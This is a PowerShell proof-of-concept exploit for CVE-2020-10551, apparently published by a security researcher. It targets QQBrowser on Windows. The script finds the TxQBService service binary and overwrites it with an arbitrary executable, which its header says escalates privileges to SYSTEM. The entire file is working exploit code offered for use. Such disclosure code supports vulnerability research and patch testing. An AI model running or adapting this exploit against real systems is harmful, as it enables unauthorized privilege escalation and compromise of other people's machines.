<####################################################################
 #                     PoC exploit for CVE-2020-10551               #
 #                   (by Maciej Miszczyk, Seqred S.A.)              #
 #                                                                  #
 # This will overwrite QQBrowser's TsService.exe with an executable #
 # of your choice. It can be used to escalate privileges to SYSTEM. #
 ####################################################################>

param(
  [Parameter(Mandatory)]
  [string]$InfilePath
)
Write-Output "[+] Acquiring path to TxQBService"
$OutfilePath=(Get-WMiObject win32_service | ?{$_.Name -eq 'TxQBService'}).PathName
$OutfilePath=$OutfilePath.Substring(1,$OutfilePath.LastIndexOf('"')-1)
Write-Output "[+] Identified path: $OutfilePath"
try{
  [System.IO.File]::WriteAllBytes($OutfilePath, [System.IO.File]::ReadAllBytes($InfilePath))
  Write-Output "[+] Overwritten contents of $OutfilePath with contents of $InfilePath"
}
catch [UnauthorizedAccessException]{ Write-Output "[-] Cannot write to $OutfilePath. Permission denied." }
